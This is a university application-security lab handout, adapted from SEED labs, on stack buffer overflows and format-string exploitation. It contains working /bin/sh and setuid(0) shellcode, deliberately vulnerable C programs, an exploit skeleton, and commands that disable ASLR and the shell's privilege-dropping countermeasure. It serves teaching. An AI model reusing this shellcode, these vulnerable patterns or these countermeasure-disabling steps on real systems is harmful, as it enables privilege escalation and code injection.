# **NYU – CSGY-9163 Application Security - Spring22 – Lab 1**

> Copyright © 2006 - 2020 by Wenliang Du.
\
 This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License. If you remix, transform, or build upon the material, this copyright notice must be left intact, or reproduced in a way that is reasonable to the medium in which the work is being re-published.


# **Part 0: Working Repository and Submission**
## 1) Synchronize Your Repository and Acquire the Lab Material
---
Log into GitHub within any web browser and create an empty, **private** repository named ``<NetID>-appsec1``.

Now, using the Ubuntu 20.04.3 LTS course virtual machine (https://drive.google.com/file/d/1rhzwJaiFmKy8SbvQuLIP_EQBsIskDNMz/view?usp=sharing; `nyuappsec` is the password), open the command shell and execute the following commands, replacing ``<YourGitHubHandle>`` with your own GitHub username and ``<NetID>`` with your own NYU NetID:

> If you do not know how to create a personal access token to use with the command line, follow the instructions here: https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token

> **⚠ Warning!** Using your personal access token directly within commands, as shown in the laboratory instructions, is not a secure practice. A threat actor in a position to view the command history of the user account on the system may abuse the token to gain unauthorized access and/or make unauthorized modifications to your GitHub account. Use an appropriately secured environment variable, an access-controlled file, or another mitigation technique if you want to avoid leaving your GitHub Personal Access Token in your command history.
```
cd ~
git clone https://github.com/NYUJRA/AppSec1.git AppSec1
cd AppSec1
git remote remove origin
git init
git remote add origin https://<YourGitHubHandle>:<YourPersonalAccessToken>@github.com/<YourGitHubHandle>/<NetID>-appsec1.git
git branch -M master
git push -u origin master
```


You should now have a local working directory in ``~/AppSec1`` that is configured to use your remote GitHub repository at ``https://github.com/<YourGitHubHandle>/<NetID>-appsec1`` as a version control system.

## 2) What to Submit
---
Submit your AppSec1 repository along with detailed lab report, with screenshots, to describe the specific actions taken to complete each task. Enough detail should be provide that enable the recipient of your report to blindly reproduce your actions to achieve the same outcomes. Provide explanation to the observations that are interesting or surprising.

All lab tasks should be performed in the provided NYU-AppSec/CSGY9163 Ubuntu 20.04.3LTS virtual machine. Each task is required to include a minimum of 1 screenshot to prove your individual completion of the task. **Every screenshot is required to include the date and time displayed in your virtual machine; otherwise, credit for the particular task will be removed.**

For tasks involving source code or exploit code, include the important code snippets followed by explanation. Simply executing code without explanation will not be eligible for credit.

**Your report _must_ be written in markdown.** Create a folder in your AppSec1 repository, using "Report" as the new folder's name. Within `Report/`, create a sub-folder called "Artifacts" within it. Store all of your screenshots and related laboratory artifacts within the "Artifacts" sub-folder, and include two separate markdown files in the "Report" sub-folder - one for part 2, and one for part two.

Your repository should now include the following file structure:

    - Part 1 - Local Buffer Overflow/
        - ...
    - Part 2 - Format String Exploitation/
        - ...
    - Reports/
        - Artifacts/
            - <netID>-screenshot1.jpg
            - <netID>-screenshot2.jpg
        - <netID>-AppSec-Lab1-Part1.md
        - <netID>-AppSec-Lab1-Part2.md
    - README.md

Your reports will be graded with each task having equal weight, and your writing will be assessed for completeness, technical accuracy, correctness, and re-producibility.

## 1) How to Submit
---

You must submit your assigment in two places.
1. In BrightSpace, submit a link to your assignment repository.
2. Update the "Assignment 1 Report URL" column in the grading allocation spreadsheet (https://docs.google.com/spreadsheets/d/1y57x4X4nI1FvESEGO9lxLw0HgQtfOn0z5aO3yIqoCy8/edit?usp=sharing) with a link to your private AppSec 1 repository.

    2a. You must invite the professor(s) to collaborate on your private repository
        \
         - Professor Allen's GitHub handle is `NYUJRA`
        \
         - Professor Abdala's GitHub handle is `kurlee`

    2b. You must invite the course assistant(s) to collaborate on your private repository
        \
         - TBD's GitHub handle is `TBD`

Timeliness of your submission will be corroborated with your GitHub commit history. Commits made after the assignment's submission deadline will not be considered for grading.

# **Part 1: Local Buffer Overflow**


## 1) Overview
---
Buffer overflow is defined as the condition in which a program attempts to write data beyond the boundary of a buffer. This vulnerability can be used by a malicious user to alter the flow control of the program, leading to the execution of malicious code. The objective of this lab is for students to gain practical insights into this type of vulnerability, and learn how to exploit the vulnerability in attacks.

In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against buffer-overflow attacks. Students need to evaluate whether the schemes work or not and explain why. This lab covers the following topics:

- Buffer overflow vulnerability and attack
- Stack layout
- Address randomization, non-executable stack, and StackGuard
- Shellcode (32-bit and 64-bit)
- The return-to-libc attack, which aims at defeating the non-executable stack countermeasure, is covered in a separate lab.

Before diving into Part 1 of this lab, the following reading is recommended:
- Chapter 4 of _Computer & Internet Security: A Hands-on Approach 2e_, by Wenliang Du.

## 2) Environment Setup
---
## 2.1 Turning Off Countermeasures

Modern operating systems have implemented several security mechanisms to make the buffer-overflow attack difficult. To simplify our attacks, we need to disable them first. Later on, we will enable them and see whether our attack can still be successful or not.

Address Space Randomization. Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. This feature can be disabled using the following command:
```
$ sudo sysctl -w kernel.randomize\_va\_space=0
```
Configuring **/bin/sh**. In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the /bin/dash shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process's real user ID, essentially dropping the privilege.

Since our victim program is a Set-UID program, and our attack relies on running /bin/sh, the countermeasure in /bin/dash makes our attack more difficult. Therefore, we will link /bin/sh to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in /bin/dash can be easily defeated). It can be installed with the following command:
```
$ sudo apt install zsh
```
Once zsh is installed, the following command can be used to link /bin/sh to zsh:
```
$ sudo ln -sf /bin/zsh /bin/sh
```
StackGuard and Non-Executable Stack. These are two additional countermeasures implemented in the system. They can be turned off during the compilation. We will discuss them later when we compile the vulnerable program.

## 3) Task 1: Getting Familiar with Shellcode
---
The ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the code can be executed using the target program's privilege. Shellcode is widely used in most code-injection attacks. Let us get familiar with it in this task.

### 3.1 The C Version of Shellcode

A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following:
```c
#include <stdio.h>

int main() {   
    char \*name[2];
    name[0] = "/bin/sh"; name[1] = NULL;
    execve(name[0], name, NULL);
}
```

Unfortunately, we cannot just compile this code and use the binary code as our shellcode (detailed explanation is provided in the SEED book). The best way to write a shellcode is to use assembly code. In this lab, we only provide the binary version of a shellcode, without explaining how it works (it is non-trivial). If you are interested in how exactly shellcode works and you want to write a shellcode from scratch, you can learn that from a separate SEED lab called _Shellcode Lab_.

### 3.2 32-bit Shellcode
```asm
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp    ; ebx -- "/bin//sh": execve()'s 1st argument

; Construct the argument array argv[]
push eax        ; argv[1] = 0
push ebx        ; argv[0] --> "/bin//sh"
mov ecx, esp    ; ecx --> argv[]: execve()'s 2nd argument

; For environment variable
xor edx, edx    ; edx = 0: execve()'s 3rd argument

; Invoke execve()
xor eax, eax
mov al, 0x0b    ;execve()'s system call number int 0x80
```

The shellcode above basically invokes the execve() system call to execute /bin/sh. In a separate SEED lab, the Shellcode lab, we guide students to write shellcode from scratch. Here we only give a very brief explanation.

- The third instruction pushes "//sh", rather than "/sh" into the stack. This is because we need a 32-bit number here, and "/sh" has only 24 bits. Fortunately, "//" is equivalent to "/", so we can get away with a double slash symbol.
- We need to pass three arguments to execve() via the ebx, ecx and edx registers, respectively. The majority of the shellcode basically constructs the content for these three arguments.
- The system call execve() is called when we set al to 0x0b, and execute "int 0x80".

### 3.3 64-Bit Shellcode

We provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except that the names of the registers are different and the registers used by the execve() system call are also different. Some explanation of the code is given in the comment section, and we will not provide detailed explanation on the shellcode.

```asm
xor rdx, rdx        ; rdx = 0: execve()'s 3rd argument
push rdx
mov rax, '/bin//sh' ; the command we want to run
push rax
mov rdi, rsp        ; rdi --> "/bin//sh": execve()'s 1st argument
push rdx            ; argv[1] = 0
push rdi            ; argv[0] --> "/bin//sh"
mov rsi, rsp        ; rsi --> argv[]: execve()'s 2nd argument
xor rax, rax
mov al, 0x3b        ; execve()'s system call number syscall
```

### 3.4 Task: Invoking the Shellcode

We have generated the binary code from the assembly code above, and put the code in a C program called callshellcode.c inside the shellcode folder. If you would like to learn how to generate the binary code yourself, you should work on the Shellcode lab. In this task, we will test the shellcode.

_Listing 1: callshellcode.c_
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}
```

The code above includes two copies of shellcode, one is 32-bit and the other is 64-bit. When we compile the program using the -m32 flag, the 32-bit version will be used; without this flag, the 64-bit version will be used. Using the provided Makefile, you can compile the code by typing make. Two binaries will be created, a32.out (32-bit) and a64.out (64-bit). Run them and describe your observations. It should be noted that the compilation uses the execstack option, which allows code to be executed from the stack; without this option, the program will fail.

## 4) Task 2: Understanding the Vulnerable Program
---
The vulnerable program used in this lab is called stack.c, which is in the code folder. This program has a buffer-overflow vulnerability, and your job is to exploit this vulnerability and gain the root privilege. The code listed below has some non-essential information removed, so it is slightly different from what you get from the lab setup file.

_Listing 2: The vulnerable program (stack.c)_

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 90
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}
```

The above program has a buffer overflow vulnerability. It first reads an input from a file called badfile, and then passes this input to another buffer in the function bof(). The original input can have a maximum length of 517 bytes, but the buffer in bof() is only BUFSIZE bytes long, which is less than 517. Because strcpy() does not check boundaries, buffer overflow will occur. Since this program is a root-owned Set-UID program, if a normal user can exploit this buffer overflow vulnerability, the user might be able to get a root shell. It should be noted that the program gets its input from a file called badfile. This file is under users' control. Now, our objective is to create the contents for badfile, such that when the vulnerable program copies the contents into its buffer, a root shell can be spawned.

**Compilation.** To compile the above vulnerable program, do not forget to turn off the StackGuard and the non-executable stack protections using the -fno-stack-protector and "-z execstack" options. After the compilation, we need to make the program a root-owned Set-UID program. We can achieve this by first change the ownership of the program to root (Line 1), and then change the permission to 4755 to enable the Set-UID bit (Line 2). It should be noted that changing ownership must be done before turning on the Set-UID bit, because ownership change will cause the Set-UID bit to be turned off.
```
$ gcc -DBUF\_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

The compilation and setup commands are already included in Makefile, so we just need to type `make` to execute those commands (instead of the steps shown above). The variables L1, ..., L4 are set in Makefile; they will be used during the compilation. If the instructor has chosen a different set of values for these variables, you need to change them in `Makefile`.

## 5) Task 3: Launching Attack on 32-bit Program (Level 1)
---
### 5.1 Investigation

To exploit the buffer-overflow vulnerability in the target program, the most important thing to know is the distance between the buffer's starting position and the place where the return-address is stored. We will use a debugging method to find it out. Since we have the source code of the target program, we can compile it with the debugging flag turned on. That will make it more convenient to debug.

We will add the -g flag to gcc command, so debugging information is added to the binary. If you run make, the debugging version is already created. We will use gdb to debug stack-L1-dbg. We need to create a file called badfile before running the program.

> **NOTE:** The specific memory addresses shown in the lab listings, snippets, and source files may differ from those ultimately shown in your actual lab terminal. It is the student's responsibility to determine and use the correct values as necessary.

```bash
$ touch badfile # Create an empty badfile
$ gdb stack-L1-dbg
gdb-peda$ b bof #Set a break point at function bof()
Breakpoint 1 at 0x124d: file stack.c, line 18.
gdb-peda$ run # Start executing the program
...
Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
18  {
gdb-peda$ next # See the note below
...
22    strcpy(buffer, str); 
gdb-peda$ p $ebp # Get the ebp value
$1 = (void \*) 0xffffdfd8
gdb-peda$ p &buffer # Get the buffer's address
$2 = (char (\*)[100]) 0xffffdfac
gdb-peda$ quit # exit
```
**Note 1.** When gdb stops inside the bof() function, it stops before the ebp register is set to point to the current stack frame, so if we print out the value of ebp here, we will get the caller's ebp value. We need to use next to execute a few instructions and stop after the ebp register is modified to point to the stack frame of the bof() function. The SEED book is based on Ubuntu 16.04, and gdb's behavior is slightly different, so the book does not have the next step.

**Note 2.** It should be noted that the frame pointer value obtained from gdb is different from that during the actual execution (without using gdb). This is because gdb has pushed some environment data into the stack before running the debugged program. When the program runs directly without using gdb, the stack does not have those data, so the actual frame pointer value will be larger. You should keep this in mind when constructing your payload.

### 5.2 Launching Attacks

To exploit the buffer-overflow vulnerability in the target program, we need to prepare a payload, and save it inside badfile. We will use a Python program to do that. We provide a skeleton program called exploit.py, which is included in the lab setup file. The code is incomplete, and students need to replace some of the essential values in the code.

_Listing 3: exploit.py_
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"  
  "\x90\x90\x90\x90"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x00           # Change this number 
offset = 0              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```
After you finish the above program, run it. This will generate the contents for badfile. Then run the vulnerable program stack. If your exploit is implemented correctly, you should be able to get a root shell:
```bash
$./exploit.py # create the badfile

$./stack-L1 # launch the attack by running the vulnerable program  <---- Bingo! You've got a root shell!
```
In your lab report, in addition to providing screenshots to demonstrate your investigation and attack, you also need to explain how the values used in your exploit.py are decided. These values are the most important part of the attack, so a detailed explanation can help the instructor grade your report. Only demonstrating a successful attack without explaining why the attack works will not receive many points.

## 6) Task 5: Launching Attack on 64-bit Program (Level 3)
---
In this task, we will compile the vulnerable program into a 64-bit binary called stack-L3. We will launch attacks on this program. The compilation and setup commands are already included in Makefile. Similar to the previous task, detailed explanation of your attack needs to be provided in the lab report.

Using gdb to conduct an investigation on 64-bit programs is the same as that on 32-bit programs. The only difference is the name of the register for the frame pointer. In the x86 architecture, the frame pointer is ebp, while in the x64 architecture, it is rbp.

Challenges. Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space, only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed. That means for every address (8 bytes), the highest two bytes are always zeros. This causes a problem.

In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied into the stack via strcpy(). We know that the strcpy() function will stop copying when it sees a zero. Therefore, if zero appears in the middle of the payload, the content after the zero cannot be copied into the stack. How to solve this problem is the most difficult challenge in this attack.

## 7) Task 7: Defeating **dash**'s Countermeasure
---
The dash shell in the Ubuntu OS drops privileges when it detects that the effective UID does not equal to the real UID (which is the case in a Set-UID program). This is achieved by changing the effective UID back to the real UID, essentially, dropping the privilege. In the previous tasks, we let /bin/sh points to another shell called zsh, which does not have such a countermeasure. In this task, we will change it back, and see how we can defeat the countermeasure. Please do the following, so /bin/sh points back to /bin/dash.
```bash
$ sudo ln -sf /bin/dash /bin/sh
```
To defeat the countermeasure in buffer-overflow attacks, all we need to do is to change the real UID, so it equals the effective UID. When a root-owned Set-UID program runs, the effective UID is zero, so before we invoke the shell program, we just need to change the real UID to zero. We can achieve this by invoking setuid(0) before executing execve() in the shellcode.

The following assembly code shows how to invoke setuid(0). The binary code is already put inside callshellcode.c. You just need to add it to the beginning of the shellcode.
```asm
; Invoke setuid(0): 32-bit xor ebx, ebx ; ebx = 0: setuid()'s argument xor eax, eax mov al, 0xd5 ; setuid()'s system call number int 0x80

; Invoke setuid(0): 64-bit

xor rdi, rdi ; rdi = 0: setuid()'s argument xor rax, rax mov al, 0x69 ; setuid()'s system call number syscall
```
Experiment. Compile callshellcode.c into root-owned binary (by typing "make setuid"). Run the shellcode a32.out and a64.out with or without the setuid(0) system call. Please describe and explain your observations.

Launching the attack again. Now, using the updated shellcode, we can attempt the attack again on the vulnerable program, and this time, with the shell's countermeasure turned on. Repeat your attack on Level 1, and see whether you can get the root shell. After getting the root shell, please run the following command to prove that the countermeasure is turned on. Although repeating the attacks on Levels 2 and 3 are not required, feel free to do that and see whether they work or not.
```
\# ls -l /bin/sh /bin/zsh /bin/dash
```

## 8) Task 8: Defeating Address Randomization
---
On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base address can have 219 =524_,_288 possibilities. This number is not that high and can be exhausted easily with the brute-force approach. In this task, we use such an approach to defeat the address randomization countermeasure on our 32-bit VM. First, we turn on the Ubuntu's address randomization using the following command. Then we run the same attack against stack-L1. Please describe and explain your observation.
```bash
$ sudo /sbin/sysctl -w kernel.randomize\_va\_space=2
```
We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that the address we put in the badfile can eventually be correct. We will only try this on stack-L1, which is a 32-bit program. You can use the following shell script to run the vulnerable program in an infinite loop. If your attack succeeds, the script will stop; otherwise, it will keep running. Please be patient, as this may take a few minutes, but if you are very unlucky, it may take longer. Please describe your observation.

```bash
#!/bin/bash
SECONDS=0
value=0
while true; do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    echo "$min minutes and $sec seconds elapsed."
    echo "The program has been running $value times so far."./stack-L1
done
```

Brute-force attacks on 64-bit programs is much harder, because the entropy is much larger. Although this is not required, free free to try it just for fun. Let it run overnight. Who knows, you may be very lucky.

---
## 9) Tasks 9: Experimenting with Other Countermeasures
---
### **Task 9.a:** Turn on the StackGuard Protection

Many compiler, such as gcc, implements a security mechanism called _StackGuard_ to prevent buffer overflows. In the presence of this protection, buffer overflow attacks will not work. In our previous tasks, we disabled the StackGuard protection mechanism when compiling the programs. In this task, we will turn it on and see what will happen.

First, repeat the Level-1 attack with the StackGuard off, and make sure that the attack is still successful. Remember to turn off the address randomization, because you have turned it on in the previous task. Then, we turn on the StackGuard protection by recompiling the vulnerable stack.c program without the -fno-stack-protector flag. In gcc version 4.3.3 and above, StackGuard is enabled by default. Launch the attack; report and explain your observations.

### **Task 9.b:** Turn on the Non-executable Stack Protection

Operating systems used to allow executable stacks, but this has now changed: In Ubuntu OS, the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the gcc, which by default makes stack non-executable. We can specifically make it nonexecutable using the "-z noexecstack" flag in the compilation. In our previous tasks, we used "-z execstack" to make stacks executable.

In this task, we will make the stack non-executable. We will do this experiment in the shellcode folder. The callshellcode program puts a copy of shellcode on the stack, and then executes the code from the stack. Please recompile callshellcode.c into a32.out and a64.out, without the "-z execstack" option. Run them, describe and explain your observations.

Defeating the non-executable stack countermeasure. It should be noted that non-executable stack only makes it impossible to run shellcode on the stack, but it does not prevent buffer-overflow attacks, because there are other ways to run malicious code after exploiting a buffer-overflow vulnerability. The _return-tolibc_ attack is an example. We have designed a separate lab for that attack. If you are interested, please see our Return-to-Libc Attack Lab for details.


# **Part 2: Format String Exploitation**

## 1 Overview
---
The printf() function in C is used to print out a string according to a format. Its first argument is called _format string_, which defines how the string should be formatted. Format strings use placeholders marked by the % character for the printf() function to fill in data during the printing. The use of format strings is not only limited to the printf() function; many other functions, such as sprintf(), fprintf(), and scanf(), also use format strings. Some programs allow users to provide the entire or part of the contents in a format string. If such contents are not sanitized, malicious users can use this opportunity to get the program to run arbitrary code. A problem like this is called _format string vulnerability_.

The objective of this lab is for students to gain the first-hand experience on format string vulnerabilities by putting what they have learned about the vulnerability from class into actions. Students will be given a program with a format string vulnerability; their task is to exploit the vulnerability to achieve the following damage: (1) crash the program, (2) read the internal memory of the program, (3) modify the internal memory of the program, and most severely, (4) inject and execute malicious code using the victim program's privilege. This lab covers the following topics:

- Format string vulnerability, and code injection
- Stack layout
- Shellcode
- Reverse shell

Readings and videos. Detailed coverage of the format string attack can be found in the following:

- Chapter 6 of _Computer & Internet Security: A Hands-on Approach 2e_ by Wenliang Du. 
- The lab also involves reverse shell, which is covered in Chapter 9.

## 2) Environment Setup
---
### 2.1 Turning of Countermeasure

Modern operating systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of the format-string attack. To simplify the tasks in this lab, we turn off the address randomization using the following command:
```
$ sudo sysctl -w kernel.randomize\_va\_space=0
```
## 2.2 The Vulnerable Program

The vulnerable program used in this lab is called format.c, which can be found in the server-code folder. This program has a format-string vulnerability, and your job is to exploit this vulnerability. The code listed below has the non-essential information removed, so it is different from what you get from the lab setup file.

_Listing 1: The vulnerable program format.c (with non-essential information removed)_

```c
unsigned int target = 0x11223344;
char \*secret = "A secret message\n";
void myprintf(char \*msg) {
    // This line has a format-string vulnerability
    printf(msg);
}

int main(int argc, char \*\*argv){
    char buf[1500];
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Input size: %d\n", length);
    myprintf(buf);return 1;
}
```

The above program reads data from the standard input, and then passes the data to myprintf(), which calls printf() to print out the data. The way how the input data is fed into the printf() function is unsafe, and it leads to a format-string vulnerability. We will exploit this vulnerability.

The program will run on a server with the root privilege, and its standard input will be redirected to a TCP connection between the server and a remote user. Therefore, the program actually gets its data from a remote user. If users can exploit this vulnerability, they can cause damages.

Compilation. We will compile the format program into both 32-bit and 64-bit binaries. Our pre-built Ubuntu 20.04 VM is a 64-bit VM, but it still supports 32-bit binaries. All we need to do is to use the -m32 option in the gcc command. For 32-bit compilation, we also use -static to generate a statically-linked binary, which is self-contained and not depending on any dynamic library, because the 32-bit dynamic libraries are not installed in our containers.

The compilation commands are already provided in Makefile. To compile the code, you need to type make to execute those commands. After the compilation, we need to copy the binary into the fmt-containers folder, so they can be used by the containers. The following commands conduct compilation and installation.
```
$ make

$ make install
```
During the compilation, you will see a warning message. This warning is generated by a countermeasure implemented by the gcc compiler against format string vulnerabilities. We can ignore this warning for now.
```
format.c: In function 'myprintf':
format.c:33:5: warning: format not a string literal and no format arguments
                        [-Wformat-security]
  44 | printf(msg);
     | ˆ˜˜˜˜˜
```

It should be noted that the program needs to be compiled using the "-z execstack" option, which allows the stack to be executable. Our ultimate goal is to inject code into the server program's stack, and then trigger the code. Non-executable stack is a countermeasure against stack-based code injection attacks, but it can be defeated using the return-to-libc technique, which is covered by another SEED labs. In this lab, for simplicity, we disable this defeat-able countermeasure.

**The Server Program.** In the server-code folder, you can find a program called server.c. This is the main entry point of the server. It listens to port 9090. When it receives a TCP connection, it invokes the format program, and sets the TCP connection as the standard input of the format program. This way, when format reads data from stdin, it actually reads from the TCP connection, i.e. the data are provided by the user on the TCP client side. It is not necessary for students to read the source code of server.c.

We have added a little bit of randomness in the server program, so different students are likely to see different values for the memory addresses and frame pointer. The values only change when the container restarts, so as long as you keep the container running, you will see the same numbers (the numbers seen by different students are still different). This randomness is different from the address-randomization countermeasure. Its sole purpose is to make students' work a little bit different.

### 2.3 Container Setup and Commands

Please download the Labsetup.zip file to your VM from the lab's website, unzip it, enter the Labsetup folder, and use the docker-compose.yml file to set up the lab environment. Detailed explanation of the content in this file and all the involved Dockerfile can be found from the user manual, which is linked to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is very important that you read the user manual.

In the following, we list some of the commonly used commands related to Docker and Compose.
```
$ docker-compose build # Build the container image

$ docker-compose up # Start the container

$ docker-compose down # Shut down the container (or Ctrl + C)
```

All the containers will be running in the background. To run commands on a container, we often need to get a shell on that container. We first need to use the "docker ps" command to find out the ID of the container, and then use "docker exec" to start a shell on that container. We have created aliases for them in the .bashrc file.

```bash
 $ docker ps
 $ docker exec -it <CONTAINER_ID> bash
 
 # The following example shows how to get a shell inside server-10.9.0.6
 $ docker ps
 CONTAINER ID  IMAGE
 b1004832e275  server-10.9.0.5
 0af4ea7a3e2e  server-10.9.0.6
 $ docker exec -it 0af bash
 root@0af4ea7a3e2e:/#
 
# Note: If a docker command requires a container ID, you do not need to
# type the entire ID string. Typing the first few characters will
# be sufficient, as long as they are unique among all the containers.
 ```

## 3) Task 1: Crashing the Program
---
When we start the containers using the included docker-compose.yml file, two containers will be started, each running a vulnerable server. For this task, we will use the server running on 10.9.0.5, which runs a 32-bit program with a format-string vulnerability. Let's first send a benign message to this server. We will see the following messages printed out by the target container (the actual messages you see may be different).

```bash
$ echo hello | nc 10.9.0.5 9090
Press Ctrl+C

# Printouts on the container's console
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | Input buffer (address): 0xffffd2d0
server-10.9.0.5 | The secret message's address: 0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Input size: 6
server-10.9.0.5 | Frame Pointer inside myprintf() = 0xffffd1f8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hello
server-10.9.0.5 | (ˆ\_ˆ)(ˆ\_ˆ) Returned properly (ˆ\_ˆ)(ˆ\_ˆ)
server-10.9.0.5 | The target variable's value (after): 0x11223344
```

The server will accept up to 1500 bytes of the data from you. Your main job in this lab is to construct different payloads to exploit the format-string vulnerability in the server, so you can achieve the goal specified in each task. If you save your payload in a file, you can send the payload to the server using the following command.
```
$ cat <file> | nc 10.9.0.5 9090
Press Ctrl+C if it does not exit.
```
**Task.** Your task is to provide an input to the server, such that when the server program tries to print out the user input in the myprintf() function, it will crash. You can tell whether the format program has crashed or not by looking at the container's printout. If myprintf() returns, it will print out "Returned properly" and a few smiley faces. If you don't see them, the format program has probably crashed. However, the server program will not crash; the crashed format program runs in a child process spawned by the server program.

Since most of the format strings constructed in this lab can be quite long, it is better to use a program to do that. Inside the attack-code directory, we have prepared a sample code called buildstring.py for people who might not be familiar with Python. It shows how to put various types of data into a string.

## 4) Task 2: Printing Out the Server Program's Memory
---
The objective of this task is to get the server to print out some data from its memory (we will continue to use 10.9.0.5). The data will be printed out on the server side, so the attacker cannot see it. Therefore, this is not a meaningful attack, but the technique used in this task will be essential for the subsequent tasks.

- _Task 2.A:_ Stack Data. The goal is to print out the data on the stack. How many %x format specifiers do you need so you can get the server program to print out the first four bytes of your input? You can put some unique numbers (4 bytes) there, so when they are printed out, you can immediately tell. This number will be essential for most of the subsequent tasks, so make sure you get it right.
- _Task 2.B:_ Heap Data There is a secret message (a string) stored in the heap area, and you can find the address of this string from the server printout. Your job is to print out this secret message. To achieve this goal, you need to place the address (in the binary form) of the secret message in the format string.

Most computers are little-endian machines, so to store an address 0xAABBCCDD (four bytes on a 32-bit machine) in memory, the least significant byte 0xDD is stored in the lower address, while the most significant byte 0xAA is stored in the higher address. Therefore, when we store the address in a buffer, we need to save it using this order: 0xDD, 0xCC, 0xBB, and then 0xAA. In Python, you can do the following:

```python
number = 0xAABBCCDD
content[0:4] = (number).to\_bytes(4,byteorder='little')
```
## 5) Task 3: Modifying the Server Program's Memory
---
The objective of this task is to modify the value of the target variable that is defined in the server program (we will continue to use 10.9.0.5). The original value of target is 0x11223344. Assume that this variable holds an important value, which can affect the control flow of the program. If remote attackers can change its value, they can change the behavior of this program. We have three sub-tasks.

- _Task 3.A:_ Change the value to a different value. In this sub-task, we need to change the content of the target variable to something else. Your task is considered as a success if you can change it to a different value, regardless of what value it may be. The address of the target variable can be found from the server printout.
- _Task 3.B:_ Change the value to **0x5000**. In this sub-task, we need to change the content of the target variable to a specific value 0x5000. Your task is considered as a success only if the variable's value becomes 0x5000.
- _Task 3.C:_ Change the value to **0xAABBCCDD**. This sub-task is similar to the previous one, except that the target value is now a large number. In a format string attack, this value is the total number of characters that are printed out by the printf() function; printing out this large number of characters may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of %n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 216 characters does not take much time. More details can be found in the SEED book.

---
## 6) Task 4: Inject Malicious Code into the Server Program
---
Now we are ready to go after the crown jewel of this attack, code injection. We would like to inject a piece of malicious code, in its binary format, into the server's memory, and then use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code.

The technique used for this task is similar to that in the previous task: they both modify a 4-byte number in the memory. The previous task modifies the target variable, while this task modifies the return address field of a function. Students need to figure out the address for the return-address field based on the information printed out by the server.

### 6.1 Understanding the Stack Layout

To succeed in this task, it is essential to understand the stack layout when the printf() function is invoked inside myprintf(). Figure 1 depicts the stack layout. It should be noted that we intentionally placed a dummy stack frame between the main and myprintf functions, but it is not shown in the figure. Before working on this task, students need to answer the following questions (please include your answers in the lab report):

